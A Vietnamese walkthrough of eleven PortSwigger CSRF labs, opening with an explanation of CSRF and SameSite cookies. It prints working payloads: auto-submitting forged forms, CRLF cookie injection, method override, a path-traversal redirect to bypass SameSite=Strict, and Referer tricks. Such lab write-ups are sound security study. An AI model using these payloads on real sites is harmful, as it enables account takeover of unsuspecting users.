# Cross-site request forgery (CSRF)

## Khái niệm & Khai thác

- **Khái niệm**
  - CSRF ( Cross Site Request Forgery) là kỹ thuật tấn công bằng cách sử dụng quyền chứng thực của người dùng đối với một website. CSRF là kỹ thuật tấn công vào người dùng, dựa vào đó hacker có thể thực thi những thao tác phải yêu cầu sự chứng thực. Về cơ bản, CSRF là dạng lỗ hổng bảo mật của web cho phép attacker có thể dẫn dụ người dùng thực thi các hành động một cách “vô thức”.
  - hành động trong “vô thức” này cũng diễn ra với Server-side request forgery – SSRF. Điểm khác biệt ở đây là:
    - **SSRF** diễn ra ở phía server side, tức nạn nhân bị dụ dỗ là server-side application
    - **CSRF** diễn ra ở phía client side, tức nạn nhân bị dụ dỗ là người dùng.

![image](https://hackmd.io/_uploads/Hy-oddE5T.png)

- Vấn đề là các HTTP request từ trang web ngân hàng và các request từ trang web của kẻ tấn công là giống nhau. Điều này dẫn đến không có cách nào để từ chối các request từ web độc và cho phép chúng điều hướng đến trang web ngân hàng. Để chống lại các cuộc tấn công CSRF chúng ta cần đảm bảo rằng các request từ web độc không lấy được bất cứ thông tin nào trong web ngân hàng. Giải pháp được sử dụng đó là Synchronizer Token Pattern. Điều này đảm bảo rằng với mỗi request được yêu cầu, ngoài session cookie hiện tại thì sẽ có một mã token được sinh ra ngẫu nhiên như một tham số của HTTP. Khi mà request được submit, server sẽ tìm kiếm giá trị token trong request và so sánh với giá trị token được lưu trên server, nếu không khớp thì request sẽ thất bại. Chúng ta hoàn toàn có thể thoải mái vì chỉ các HTTP request mới yêu cầu mã token, mã token này sẽ được dùng để update trạng thái của các request mới. Điều này được đảm bảo an toàn vì chỉ các trang web cùng nguồn gốc mới có thể đọc được response

![image](https://hackmd.io/_uploads/rkaYft4qa.png)

- **Khai thác**
  - **Kiểu 1. Dùng form**
    - Với 1 phương pháp đơn gianr là : 1 trang web có form đổi mật khẩu có 2 field là password và password_confirm , và 1 button Submit. Hacker sẽ tạo ra 1 web giả với 1 form ẩn với các gía trị tương tự form trên và gửi cho user. Khi user vào link và bấm button submit, thì 1 request đổi password được gửi đến trang web đó, kèm thoe cookie của account user. Cuối cùng hacker chỉ cần dùng email và mật khẩu mới để đăng nhập vào acc của user.
  - **Kiểu 2. Dùng thẻ img**
    - Ngoài ra, nếu trang web chứa lỗ hổng Stored XSS (Bạn đọc có thể xem thêm tại chuỗi bài viết về lỗ hổng XSS), kẻ tấn công có thể lưu trữ mã độc javascript trong để tất cả người dùng truy cập tới trang web chứa script sẽ chuyển hướng tới chức năng chứa lỗ hổng CSRF, chẳng hạn:
    - Ví dụ khi user A muốn chuyển 1 khoản tiền là 1000 cho user B, thì trang web ngân hàng sẽ tạo ra 1 URL, ví dụ URL đó như sau: http://jav.bank?from=Person1&to=Person2&amount=1000. Hacker sẽ bỏ URL này vào 1 thẻ img. Khi user truy cập vào trang, trình duyệt sẽ tự gọi GET request, gắn kèm với cookie của user. Thông qua cookie, ngân hàng xác nhận đó là user, rồi chuyển tiền cho Hacker.
  - Nhưng mà nói thì dễ hơn làm, để CSRF attack thành công trót lọt, các điều kiện then chốt sau đây phải được đáp ứng:
    - **No unpredictable request paramenter**: Tiếp theo, đám request thực hiện relevant action phải không chứa bất kỳ parameter (tham số) nào có giá trị mà attacker không thể xác định (hoặc đoán mò).
    - **Cookie-based session handling**: Việc thực thi relevant action nói trên có thể cần diễn ra với một hoặc một vài HTTP request. Và nếu ứng dụng chỉ dựa vào session cookie để xác định người dùng thực hiện request mà không triển khai thêm bất kỳ phương án nào khác để theo dõi các session (hoặc xác minh request) của người dùng) thì coi như ngon ăn
    - **A relevant action**: Tức là đâu đó trong ứng dụng phải tồn tại ít nhất một hành động mà attacker khao khát dụ dỗ cho người dùng thực hiện. Hành động này có thể là privileged action – tức là hành động của các người dùng có quyền hạn (ví dụ admin thay đổi quyền của các user thường) hoặc đơn thuần là thao tác thay đổi dữ liệu cụ thể (ví dụ password) của người dùng nào đó

### So sánh SameSite bằng Strict, None, Lax trong cookies

| SameSite=None                                                                                                                                                                                                                                                                                                                           | SameSite=Lax                                                                                                                                                                                 | SameSite=Strict                                                                                                                                                                  |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| trong cookie là một cài đặt đặc biệt được sử dụng để xác định rằng cookie có thể được gửi qua các yêu cầu từ trang web khác, ngay cả khi đó là yêu cầu từ trang web thứ ba. Điều này là quan trọng để hỗ trợ các tình huống như iframe hoặc các yêu cầu từ trang web khác domain trong môi trường Cross-Origin Resource Sharing (CORS). | Cấp độ bảo mật ít hạn hơn. Cookie được gửi khi yêu cầu đến từ một trang web bên ngoài (liên kết), nhưng không gửi khi yêu cầu đến từ một trang web thứ ba qua một yêu cầu POST không an toàn | Cấp độ bảo mật cao hơn. Cookie chỉ được gửi khi yêu cầu đến từ cùng một trang web. Nó giúp đề phòng nhiều hơn khỏi các tấn công liên quan đến cookie, đặc biệt là tấn công CSRF. |

## 1. Lab: CSRF vulnerability with no defenses

link: https://portswigger.net/web-security/csrf/lab-no-defenses

### Đề bài

![image](https://hackmd.io/_uploads/ryNy_YN9p.png)

### Phân tích

- Ứng dụng web tồn tại lỗ hổng CSRF tại chức năng update email của tài khoản.

Thực hiện đăng nhập với account cho sẵn `wiener:peter`, ta thử update email xem.

- Bắt request và phân tích: Khi update email, một POST request được gửi đến `/my-account/change-mail` với body chỉ chứa tham số email cần thay đổi. Có thể thấy không có bất kì cơ chế chống CSRF nào ở đây cả.

- ![image](https://hackmd.io/_uploads/rycZZcV96.png)

và khi mình thay đổi phần email và gửi lại trong repeater thì email cũng thay đổi theo có thể thấy trang web chỉ nhận diện người dùng qua cookie và mình sửa data từ request và trang web vẫn chấp nhận.

### Khai thác

- mình tạo một trang web giả mạo để gửi nạn nhân với nội dung sau:

```htmlembedded=
<html>
  <body>
    <form action="https://0a53007d03276aab8418401f009e003b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a@a.a" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

- Cụ thể khi nạn nhân truy cập trang web này, nó tự động submit form update email đến đường dẫn https://0a53007d03276aab8418401f009e003b.web-security-academy.net/my-account/change-email với trường email do attacker định sẵn. Khi đó email tài khoản nạn nhân sẽ bị thay đổi.

Gửi payload trên vào exploit server.

![image](https://hackmd.io/_uploads/BJY0O9E9p.png)

Thử View exploit và thấy email của tài khoản hiện tại đã bị thay đổi.

![image](https://hackmd.io/_uploads/SkvZY9E5p.png)

Chọn store và delivery to victim thôi!

- khi nạn nhân click vào đường link chúng ta gửi thì 1 request POST sẽ được gửi từ server exploit của chúng ta kèm theo session của người dùng vẫn còn hiệu lực đến server web hiện tại và nó sẽ lầm tưởng là chính victim đang thực hiện hành động đó và chấp nhận

![image](https://hackmd.io/_uploads/Sypdd945p.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải được bài lab này

![image](https://hackmd.io/_uploads/SkBmYqVqp.png)

## 2. Lab: CSRF where token validation depends on request method

link: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

### Đề bài

![image](https://hackmd.io/_uploads/SJLnRqN9p.png)

### Phân tích

- Ở bài lab lần này, chức năng update email đã được trang bị cơ chế bảo vệ bằng CSRF token.

![image](https://hackmd.io/_uploads/H1ltJoVc6.png)

- Nếu ta chỉnh sửa hay xóa CSRF token, thì request sẽ không thành công.

Giờ để đổi được email trang web đã thêm biến csrf để phòng trường hợp ta thay đổi email của người khác, nên giá trị của biến csrf của mỗi người là khác nhau
Nhưng nếu mình đổi method thành GET thì mọi chuyện lại khác:

![image](https://hackmd.io/_uploads/SkUBZoNcT.png)

![image](https://hackmd.io/_uploads/By7LWjE9T.png)

- Như vậy, server đã chỉ validate CSRF token ở phương thức POST mà bỏ quên GET.

### Khai thác

- Ở đây mình có thể đổi thành công email mà không cần đến giá trị của biến csrf, nên em sẽ tấn công theo cách này

mình tìm payload trên payloadallthethings

![image](https://hackmd.io/_uploads/HJvbpi4q6.png)

- Bây giờ ta chỉ cần tạo payload sau:
  `<img src="https://0a4d00f104d3219582c666d30098008b.web-security-academy.net/my-account/change-email?email=abcde%40a.a">`
  và gửi vào exploit-server. Khi nạn nhân load trang exploit này, ảnh <img> trên sẽ được load với source chính là GET request để update email.
- Giờ ta sẽ đưa vào exploit server rồi đưa vào phần body, sau đó store rồi delivery to victim là có thể solve được lab rồi:

![image](https://hackmd.io/_uploads/Hyq1XiEc6.png)

- khi nạn nhân click vào đường link chúng ta gửi thì 1 request POST sẽ được gửi từ server exploit của chúng ta kèm theo session của người dùng vẫn còn hiệu lực đến server web hiện tại và nó sẽ lầm tưởng là chính victim đang thực hiện hành động đó và chấp nhận

![image](https://hackmd.io/_uploads/SyQl7oVqT.png)

## 3. Lab: CSRF where token validation depends on token being present

link: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

### Đề bài

![image](https://hackmd.io/_uploads/HymJViN5T.png)

### Phân tích

- Trang web này có chức năng chỉnh sửa email dính lỗi CSRF, tuy có truyền vào tham số csrf, nhưng trang web lại check vào phần session, khi đấy ta có thể xóa luôn tham số csrf mà trang web vẫn có thể thực hiện được việc đổi email:

![image](https://hackmd.io/_uploads/B1ubHiE9T.png)

### Khai thác

- mình dùng lại payload của bài 1

```htmlembedded=
<html>
  <body>
    <form action="https://0aeb00ee031dceb481ff2022007e003c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc@a.a" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://hackmd.io/_uploads/SkFKSoEcp.png)

Gửi cho nạn nhân và ta solve được challenge.

- khi nạn nhân click vào đường link chúng ta gửi thì 1 request POST sẽ được gửi từ server exploit của chúng ta kèm theo session của người dùng vẫn còn hiệu lực đến server web hiện tại và nó sẽ lầm tưởng là chính victim đang thực hiện hành động đó và chấp nhận

![image](https://hackmd.io/_uploads/SkRKBj4qp.png)

## 4. Lab: CSRF where token is not tied to user session

link: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

### Đề bài

![image](https://hackmd.io/_uploads/BJn_PsV9p.png)

### Phân tích

- Ứng dụng web này vẫn bị dính CSRF mặc dù có trang bị CSRF token nhưng token này không được lưu vào session của user → CSRF token của user này vẫn có thể dùng cho người khác.

Cụ thể, khi đăng nhập tài khoản `wiener:peter`, ta thu thập CSRF token tại form update email.

![image](https://hackmd.io/_uploads/HJSKdoEcT.png)

- Đăng nhập sang `carlos:montoya`, sử dụng CSRF token vừa trên để update email thì thành công → token này không được lưu vào session của từng user.

![image](https://hackmd.io/_uploads/HJv2Kj456.png)

Ta nhận thấy email đã được thay đổi thành công

![image](https://hackmd.io/_uploads/H19Ojs49p.png)

### Khai thác

- Tận dụng điều đó, ta sẽ tạo payload với CSRF token được lấy ở tài khoản đang có. Tất nhiên CSRF token phải chưa được sử dụng.
- Payload sẽ là 1 form update email với 2 trường email và csrf, trong đó csrf sẽ là giá trị CSRF token vừa lấy được ở bước trên

![image](https://hackmd.io/_uploads/r1fPqoNqp.png)

```htmlmixed=
<html>
  <body>
    <form action="https://0aab005e0339af09801a588e0073008e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;csrf&#46;com" />
        <input type="hidden" name="csrf" value="6KWeuxDe7YBDyQ9y8wJiprFhcSwh1d04" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

Store và send to victim:

![image](https://hackmd.io/_uploads/rkxAqsV9T.png)

- khi nạn nhân click vào đường link chúng ta gửi thì 1 request POST sẽ được gửi từ server exploit của chúng ta kèm theo session của người dùng vẫn còn hiệu lực đến server web hiện tại và nó sẽ lầm tưởng là chính victim đang thực hiện hành động đó và chấp nhận

![image](https://hackmd.io/_uploads/B1DAqoEq6.png)

## 5. Lab: CSRF where token is tied to non-session cookie

link: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

### Đề bài

![image](https://hackmd.io/_uploads/BJnD2jE56.png)

### Phân tích

- Thực hiện đăng nhập với user wiener và update email. Có thể thấy, ứng dụng web sử dụng một cookie csrfKey khác session để liên kết với csrf token.

![image](https://hackmd.io/_uploads/Bk4BEAV96.png)

- Nếu thay đổi crsfKey, server sẽ báo Invalid CSRF token.

![image](https://hackmd.io/_uploads/ByKcVRNca.png)

- Tuy nhiên, nếu như đăng nhập tài khoản user carlos rồi thay đổi cặp (csrfKey,csrf) thành cặp giá trị (csrfKey,csrf) của user wiener ở trên, thì request vẫn được xử lí thành công.

![image](https://hackmd.io/_uploads/B1UyLRVqp.png)

![image](https://hackmd.io/_uploads/r1PXP0EqT.png)

- Như vậy, csrf token không được liên kết vào session của từng user mà chỉ dựa vào csrfKey. Mục tiêu bây giờ của mình là làm sao thay đổi được csrfKey của nạn nhân.

- Vậy là để đổi được email của victim, ta cần csrfKey ở phần cookie header, và csrf ở body của phần POST, nhưng làm thế nào để thêm được csrfKey vào header???

Quay lại trang chủ, xuất hiện 1 form search.

![image](https://hackmd.io/_uploads/Sy1nUAE9p.png)

Thử search thì thấy chuỗi được search sẽ lưu vào cookie có tên `LastSearchTerm`.

- kết quả lại được đưa vào phần Set-Cookie, vậy thì mình có thể inject đoạn csrfKey của mình vào tính năng này, rồi sau đó sử dụng form để đổi email?

### Khai thác

Đầu tiên ta sẽ lấy 2 tham số cần dùng để đổi email:

```
csrfKey=9jO1393d6TRWSKVyHHw3jXgiH75dH3nd
csrf=etpchFmmdrxdjWX9WmHkI42IPRaYjRSu
```

Dựa vào đó, ta sẽ search với payload sau để inject csrfKey cookie.

```
a%0d%0aSet-Cookie%3A%20csrfKey%3D9jO1393d6TRWSKVyHHw3jXgiH75dH3nd%3B%20SameSite%3DNone
```

chúng ta cần thêm `SameSite=None` vì site của exploit-server khác với trang web của bài lab.
mình encode url rồi cộng thêm phần cần search ở phía trước

![image](https://hackmd.io/_uploads/rkAZy1H5p.png)

ta đã set cookie csrfKey thành công theo ý muốn (ở đây là csrfKey của user wiener ở trên)

Dựa vào phân tích trên, ta tạo được CSRF payload hoàn chỉnh như sau:

- Inject csrf cookie: Sử dụng tag `<img>`
- Form update email với csrf là giá trị csrf giống cookie csrf.

```htmlembedded
<html>
  <body>
      <img src="https://0a2100e60450bda081ba027c00dd001e.web-security-academy.net/?search=a%0d%0aSet-Cookie%3A%20csrfKey%3D9jO1393d6TRWSKVyHHw3jXgiH75dH3nd%3B%20SameSite%3DNone" onerror= 'document.forms[0].submit();'>
    <form action="https://0a2100e60450bda081ba027c00dd001e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abcd@a.a" />
        <input type="hidden" name="csrf" value="etpchFmmdrxdjWX9WmHkI42IPRaYjRSu" />
    </form>
  </body>
</html>
```

![image](https://hackmd.io/_uploads/SkBClySqT.png)

mục đích của chúng ta đã hoàn thành và mình cúng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HyBBbkH96.png)

## 6. Lab: CSRF where token is duplicated in cookie

link: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

### Đề bài

![image](https://hackmd.io/_uploads/HylZ7kSq6.png)

### Phân tích

- Đăng nhập với user wiener, ta tiếp tục tấn công CSRF tại chức năng update email. Lần này, csrf token được lưu trên cả cookie. Có nghĩa là nếu request có csrf token giống với csrf trên cookie thì sẽ được xử lí thành công.

![image](https://hackmd.io/_uploads/B1CMVkHq6.png)

- Cụ thể, thử đồng thời thay đổi csrf ở cookie và body thành 1, ta thấy request vẫn được xử lí thành công.

![image](https://hackmd.io/_uploads/r15I4Jr9T.png)

Nhiệm vụ của mình bây giờ sẽ là inject csrf bất kì trên cookie của nạn nhân rồi thực hiện sử dụng chính csrf token để tấn công.

### Khai thác

- Tương tự bài trên, sử dụng chức năng search để thực hiện inject csrf cookie.

Dựa vào phân tích trên, ta tạo được CSRF payload hoàn chỉnh như sau:

- Inject csrf cookie: Sử dụng tag `<img>`
- Form update email với csrf là giá trị csrf giống cookie csrf.

```htmlembedded
<html>
  <body>
      <img src="https://0a52000a0419f4a5819f892d0046003d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror= 'document.forms[0].submit();'>
    <form action="https://0a52000a0419f4a5819f892d0046003d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abcd@a.a" />
        <input type="hidden" name="csrf" value="fake" />
    </form>
  </body>
</html>
```

Lưu payload vào exploit-server.

![image](https://hackmd.io/_uploads/rkHjSkB5T.png)

Thực hiện Deliver exploit to victim, ta solve thành công challenge.

![image](https://hackmd.io/_uploads/HyysBkH9T.png)

## 7. Lab: SameSite Lax bypass via method override

link: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

### Đề bài

![image](https://hackmd.io/_uploads/Hy6KLkHq6.png)

### Phân tích

- Thực hiện đăng nhập với tài khoản có sẵn, session cookie được set mà không được set SameSite → mặc định ở Chrome nó sẽ là SameSite=Lax.

- SameSite=Lax: Cấp độ bảo mật ít hạn hơn. Cookie được gửi khi yêu cầu đến từ một trang web bên ngoài (liên kết), nhưng không gửi khi yêu cầu đến từ một trang web thứ ba qua một yêu cầu POST không an toàn

![image](https://hackmd.io/_uploads/H1Bbf4Sca.png)

Thực hiện các bước CSRF cơ bản như các lab trước để thay đổi email.

![image](https://hackmd.io/_uploads/BJsuQVS5p.png)

sau đó mình thay đổi lại email

- Kết quả fail do SameSite=Lax chỉ cho phép GET request đối với cross-site request.

![image](https://hackmd.io/_uploads/rkkBQ4rqT.png)

Thử update email với phương thức GET cũng không thành công.

![image](https://hackmd.io/_uploads/HkWwHErcp.png)

### Khai thác

Tuy nhiên, ta sẽ override method bằng cách thêm tham số \_method=POST để update email thành công.

![image](https://hackmd.io/_uploads/SyO5SEH5a.png)

Như vậy chỉ cần lưu payload update email sau vào exploit-server.

```javascript
<script>
  document.location="https://0a440050035497b781372fc7004100d4.web-security-academy.net/my-account/change-email?email=hacked%40gmail.com&_method=POST"
</script>
```

![image](https://hackmd.io/_uploads/rJiQLEB5T.png)

Deliver exploit to victim và ta solve được challenge

![image](https://hackmd.io/_uploads/HJQQUNSqa.png)

## 8. Lab: SameSite Strict bypass via client-side redirect

link: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

### Đề bài

![image](https://hackmd.io/_uploads/rJyOLErca.png)

### Phân tích

- Khi thực hiện đăng nhập với tài khoản `wiener:peter`, ta thấy cookie được set thêm SameSite=Strict.

- Khi một cookie được đánh dấu với SameSite=Strict, nó chỉ được gửi đến máy chủ nếu yêu cầu đến máy chủ đó xuất phát từ cùng một trang web. Nếu yêu cầu đến từ một trang web khác, trình duyệt sẽ không gửi cookie đó, giúp giảm rủi ro của việc tấn công CSRF.

![image](https://hackmd.io/_uploads/Skyl_Erca.png)

- yêu cầu này không chứa bất kỳ mã thông báo không thể đoán trước nào, do đó có thể dễ bị tấn công bởi CSRF nếu chúng ta có thể bỏ qua mọi hạn chế về cookie SameSite.

![image](https://hackmd.io/_uploads/rksZbBBca.png)

Thực hiện update email với phương thức GET thành công.

![image](https://hackmd.io/_uploads/H1Trd4Sc6.png)

mình thử tạo payload và gửi lên server exploit

```
<script>
    document.location="https://0a7d0012039f5b918087c13500840016.web-security-academy.net/my-account/change-email?email=a%40a.a&submit=1"
</script>
```

Tuy nhiên, khi thử View exploit thì bị redirect về trang login → SameSite=Strict đã chặn trong trường hợp này do 2 site khác nhau.

Chúng ta phải đi tìm cách bypass. Ở chức năng comment bài post, ứng dụng tự động redirect về trang bài post sau 3s sau khi comment thành công.

![image](https://hackmd.io/_uploads/BJ5TK4Sq6.png)

mình CTRl+U để đọc source code trước khi redirect về trang bài post
![image](https://hackmd.io/_uploads/SkJUcEBcT.png)

trang sẽ gọi đến file javascript

```
/resources/js/commentConfirmationRedirect.js
```

![image](https://hackmd.io/_uploads/BJgPq4Bc6.png)

và có đoạn code:

```javascript
redirectOnConfirmation = (blogPath) => {
  setTimeout(() => {
    const url = new URL(window.location);
    const postId = url.searchParams.get("postId");
    window.location = blogPath + "/" + postId;
  }, 3000);
};
```

- Đọc source có thể thấy, trang thực hiện redirect về trang `<LAB-DOMAIN>/post/<postId>`, trong đó postId được lấy từ tham số phương thức GET.

![image](https://hackmd.io/_uploads/SJxa2VHca.png)

vậy nếu mình thay đổi postId thành tên file mình mong muốn đọc thì sẽ như thế nào

### Khai thác

- Thử gán postId bằng chuỗi bất kì thì thấy nó vẫn redirect bình thường.

![image](https://hackmd.io/_uploads/H1eM64rca.png)

Do postId được lấy trực tiếp từ user và không có cơ chế validate → ta có thể nghĩ đến Path Traversal. Thử `postId=../../my-account` thì thấy trang /my-account được load thành công.

mình tạo payload và gửi vẫn thành công

`/post/comment/confirmation?postId=../../my-account/change-email%3femail=hacked%40csrf.com%26submit=1`

![image](https://hackmd.io/_uploads/H1lKGR4S9a.png)

- mục đích của chúng ta là để trang post bài chuyển hướng về trang đổi email và thực hiện đổi email cho chúng ta vì SameSite=Strict sẽ cho phép trong trường hợp này do cùng site

![image](https://hackmd.io/_uploads/rycgAVH96.png)

Thực hiện Deliver exploit to victim và ta solve được challenge.

![image](https://hackmd.io/_uploads/rkzgCES5a.png)

## 9. Bỏ qua SameSite Lax thông qua làm mới cookie

link: https://0ae200f20423f9ef8060445600240076.web-security-academy.net/

### Đề bài

![image](https://hackmd.io/_uploads/ByaREaSqp.png)

### Phân tích

- Nghiên cứu POST /my-account/change-emailyêu cầu và lưu ý rằng yêu cầu này không chứa bất kỳ mã thông báo không thể đoán trước nào, do đó có thể dễ bị tấn công bởi CSRF nếu mình có thể bỏ qua mọi hạn chế về cookie SameSite.

![image](https://hackmd.io/_uploads/B11fI6Scp.png)

chúng ta được xác thực qua 1 tài khoản mạng xã hội

![image](https://hackmd.io/_uploads/BJkcvpScp.png)

- Xem phản hồi cho GET /oauth-callback?code=[...]yêu cầu ở cuối luồng OAuth. Lưu ý rằng trang web không chỉ định rõ ràng bất kỳ hạn chế nào của SameSite khi đặt cookie phiên. Kết quả là trình duyệt sẽ sử dụng Laxmức hạn chế mặc định.

- Trong trình duyệt, hãy lưu ý rằng nếu bạn truy cập /social-login, thao tác này sẽ tự động bắt đầu luồng OAuth đầy đủ. Nếu bạn vẫn có phiên đăng nhập với máy chủ OAuth thì tất cả điều này sẽ diễn ra mà không có bất kỳ tương tác nào.

### Khai thác

```javascript
<form method="POST" action="https://0ae200f20423f9ef8060445600240076.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0ae200f20423f9ef8060445600240076.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

![image](https://hackmd.io/_uploads/HyHzr6rq6.png)

store và gửi cho victim

![image](https://hackmd.io/_uploads/BJzqETrqT.png)

## 10. Lab: CSRF where Referer validation depends on header being present

link: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

### Đề bài

![image](https://hackmd.io/_uploads/HyLbupS56.png)

### Phân tích

- mình đăng nhập với tài khoản cho sẵn và thực hiện update email.

![image](https://hackmd.io/_uploads/B1pTuaS5T.png)

- web không có trường ngẫu nhiên khó đoán bằng csrf token cũng không có bảo vệ qua cookies bằng SameSite như những bài trước
- Ứng dụng web này trang bị cơ chế chống CSRF bằng cách validate trường Referer.

- Nếu ta thay đổi Referer khác domain của ứng dụng web thì server sẽ trả về Invalid referer header.

![image](https://hackmd.io/_uploads/S1MM5prqT.png)

- Trang web sẽ check bằng cách kiểm tra header referer của request, vì nếu không làm gì thì phần referer sẽ là exploit nên không được, vậy thì ta sẽ bỏ luôn cái header này,

![image](https://hackmd.io/_uploads/HJKr9prqa.png)

xóa header Referer luôn thì server vẫn xử lí thành công.

- Điều này suy ra được rằng server chỉ validate Referer khi nó tồn tại, còn không thì bỏ qua. Như vậy chỉ cần tạo CSRF payload thông thường và thêm <meta name="referrer" content="never"> để loại trừ Referer khỏi request.

### Khai thác

```javascript
<html>
  <meta name="referrer" content="never">
  <body>
    <form action="https://0ae600d704529dc984ec22c1002600c0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc@a.a" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://hackmd.io/_uploads/rk0A9aSqp.png)

store và gửi cho victim

![image](https://hackmd.io/_uploads/SJ-R96rq6.png)

## 11. Lab: CSRF with broken Referer validation

link: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken

### Đề bài

![image](https://hackmd.io/_uploads/H1QMERS5T.png)

### Phân tích

- tương tự bài trước ứng dụng web này trang bị cơ chế chống CSRF bằng cách validate trường Referer.

Đăng nhập với tài khoản cho sẵn và thực hiện update email.

![image](https://hackmd.io/_uploads/rkkxBArqp.png)

Nếu ta thay đổi Referer khác domain của ứng dụng web thì server sẽ trả về Invalid referer header.

![image](https://hackmd.io/_uploads/BJzmSCrqT.png)

- Tuy nhiên khi POST request trên với trường Referer có chứa domain web là 1 query string hay là tham số thì request được xử lí thành công.

![image](https://hackmd.io/_uploads/SJMMI0Sqa.png)

Như vậy, server chỉ thực hiện validate Referer có chứa chung domain với ứng dụng web không hay thôi. Ta chỉ việc set Referer chứa domain của ứng dụng khi thực hiện CSRF.

Thực hiện vào exploit-server, chỉnh URL exploit có chứa domain của ứng dụng theo cách query string. Đồng thời payload CSRF tương tự bài lab 1.

### Khai thác

![image](https://hackmd.io/_uploads/H1GvU0S5T.png)

- Tuy nhiên đến bước Deliver exploit to victim thì vẫn không thành công. Có vẻ như domain web không được kèm theo trong Referer như mong muốn. - gặp lại lỗi "invalid Referer header". Điều này là do nhiều trình duyệt hiện loại bỏ chuỗi truy vấn khỏi tiêu đề Người giới thiệu theo mặc định như một biện pháp bảo mật. Để ghi đè hành vi này và đảm bảo rằng URL đầy đủ được đưa vào yêu cầu, quay lại máy chủ khai thác và thêm tiêu đề sau vào phần "Head":
- Để có thể chứa nó trong Referer, chỉ cần thêm header `Referrer-Policy: unsafe-url`.

![image](https://hackmd.io/_uploads/BJ1LhAB5p.png)

Có vẻ như domain web không được kèm theo trong Referer như mong muốn. Sử dụng cách thay thế như sau:

`history.pushState("", "", "/<LAB-DOMAIN>")`

Thêm đoạn script trên vào và send exploit đến nạn nhân.

```htmlembedded
<html>
  <body>
    <form action="https://0acf00db0399b66981c044b100e800b0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc@a.a" />
    </form>
    <script>
        history.pushState("", "", "/?0acf00db0399b66981c044b100e800b0.web-security-academy.net")
        document.forms[0].submit();
    </script>
  </body>
</html>
```

và mình đã giải quyết được lab này

![image](https://hackmd.io/_uploads/H1TG2AScp.png)
